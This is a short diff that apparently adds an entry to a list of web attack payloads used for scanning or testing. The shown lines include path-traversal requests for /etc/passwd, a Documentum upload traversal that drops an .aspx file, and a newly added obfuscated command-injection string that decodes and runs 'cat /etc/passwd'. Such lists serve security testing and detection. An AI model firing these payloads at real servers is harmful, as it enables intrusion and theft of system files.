@@ -5467,3 +5467,4 @@ show_log.php?file=../../../../../../../../../../etc/passwd
 /assets/css///////../../../../../../../../etc/passwd
 documentum/upload.aspx?parentid=QUFBQUFBQUFBQUFBQUFBi0FBQUFBQUFBQUFBQUFBQUE%3D&raw=1&unzip=on&uploadid=x\..\..\..\cifs&filename=x.aspx
 /documentum/upload.aspx?parentid=QUFBQUFBQUFBQUFBQUFBi0FBQUFBQUFBQUFBQUFBQUE%3D&raw=1&unzip=on&uploadid=x\..\..\..\cifs&filename=x.aspx
+/?param=e\\\\c\\\\h\\\\o\$IFS-e\$IFS'\\\\x63\\\\x61\\\\x74\\\\x20\\\\x2F\\\\x65\\\\x74\\\\x63\\\\x2F\\\\x70\\\\x61\\\\x73\\\\x73\\\\x77\\\\x64'|/???/\\\\b**\\\\h
